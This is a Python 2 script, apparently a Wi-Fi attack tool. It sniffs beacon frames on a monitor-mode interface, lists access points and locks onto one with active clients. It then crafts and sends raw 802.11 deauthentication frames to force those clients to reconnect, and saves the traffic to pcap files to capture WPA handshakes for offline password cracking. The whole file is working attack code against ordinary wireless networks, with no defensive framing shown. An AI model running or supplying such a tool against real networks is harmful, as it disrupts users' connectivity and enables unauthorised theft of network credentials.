import os
import time
import socket
import struct
from lib.Pcap import Pcap
from lib.AccessPoint import AccessPoint

FRAME_TYPE_ACK_BEACON = '80'
FRAME_TYPE_ACK_BLOCK = '84'
FRAME_TYPE_QOS = '88'

def printAPFound(f_type, ssid, channel, addr1, addr2, addr3):
   print """
         ++++++++++ [ Beacon Frame ] ++++++++++++++++++++
         Frame Type  : {}
         SSID        : {}
         Channel     : {}
         Receiver    : {}
         Transmitter : {}
         Source      : {}
         ++++++++++++++++++++++++++++++++++++++++++++++++
         """.format(f_type, ssid, channel, addr(addr1), addr(addr2), addr(addr3))

def addr(s):
   return "{}{}:{}{}:{}{}:{}{}:{}{}:{}{}".format(*s.upper())

def pack_dot11(mac_src, mac_dst):
   print mac_dst
   dot11_type_sub = 0xc0
   dot11_flags = 0
   dot11_seq = 1810
   dot11 =  struct.pack('HH6s6s6sH', dot11_type_sub, dot11_flags, mac_dst.decode("hex"), mac_src.decode("hex"), mac_src.decode("hex"), dot11_seq)
   print dot11
   return dot11

def pack_radiotap():
   r_rev = 0
   r_pad = 0
   r_len = 26
   r_preset_flags = 0x0000482f
   r_timestamp = 0
   r_flags = 0
   r_rate = 2
   r_freq = 2437
   r_ch_type = 0xa0
   r_signal = -48
   r_antenna = 1
   r_rx_flags = 0 
   return struct.pack('BBHIQBBHHbBH', r_rev, r_pad, r_len, r_preset_flags, r_timestamp, r_flags, r_rate, r_freq, r_ch_type, r_signal, r_antenna, r_rx_flags)

def sendDeauthPacket(s, src, dst):
   deauth_frame = struct.pack('!H', 1)
   s.send(pack_radiotap() + pack_dot11(src, dst) + deauth_frame)

ap_list = []
ap_to_sniff = None

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
s.bind(('wlan0mon',0x0003))

pcap = None

while True:
   pkt = s.recvfrom(2048)[0]

   if pkt[2:4].encode('hex') == '1a00':
      len_of_header = struct.unpack('h', pkt[2:4])[0]
    
      radio_tap_header_frame = pkt[:len_of_header].encode('hex')
      
      beacon_frame = pkt[len_of_header:len_of_header + 24].encode('hex')

      f_type = beacon_frame[:2]
      addr1  = beacon_frame[8:20]
      addr2  = beacon_frame[20:32]
      addr3  = beacon_frame[32:44]

      try:
         len_of_ssid = ord(pkt[63])
         ssid = pkt[64:64 + len_of_ssid]
         channel = ord(pkt[64 + len_of_ssid + 12])
      except:
         ssid = "Unknown"
         channel = 0
      
      ap = AccessPoint(ssid, channel, addr2)

      if ap_to_sniff is not None:
         pcap.write(pkt)
         pcap.pcap_file.flush()

         if f_type == FRAME_TYPE_QOS and len(pkt) == 163 and ap.mac == ap_to_sniff.mac:
            print 'Handshake Found on {}'.format(ap_to_sniff.ssid)
            ap_to_sniff = None

      if f_type == FRAME_TYPE_ACK_BLOCK and ap_to_sniff is not None:
         if (addr1 not in ap_to_sniff.active_targets):
            ap_to_sniff.active_targets.append(addr1)

         print 'Sending deauth packet to {}'.format(addr1)
         sendDeauthPacket(s, addr2, addr1)
         continue

      if f_type == FRAME_TYPE_ACK_BLOCK and ap_to_sniff is None:
         ap_found = next((x for x in ap_list if x.mac == addr2), None)
         if ap_found is not None:
            ap_to_sniff = ap_found
            ap_to_sniff.active_targets.append(addr1)

            ap_output_dir = './output/wpa_handshake/{}'.format(ap_found.mac)
            if not os.path.exists(ap_output_dir):
               os.mkdir(ap_output_dir)

            pcap_file = '{}/{}-{}.pcap'.format(ap_output_dir, ap_to_sniff.ssid, time.time())
            pcap = Pcap(pcap_file)
            
            print 'Starting listen on AP: {}'.format(ap_found.mac)
         continue

      ap_already_found = next((x for x in ap_list if x.ssid == ssid), None)
      if ap_already_found is None and f_type == FRAME_TYPE_ACK_BEACON:
         if channel is not 0:
            ap_list.append(ap)
            printAPFound(f_type, ssid, channel, addr1, addr2, addr3)
         
         

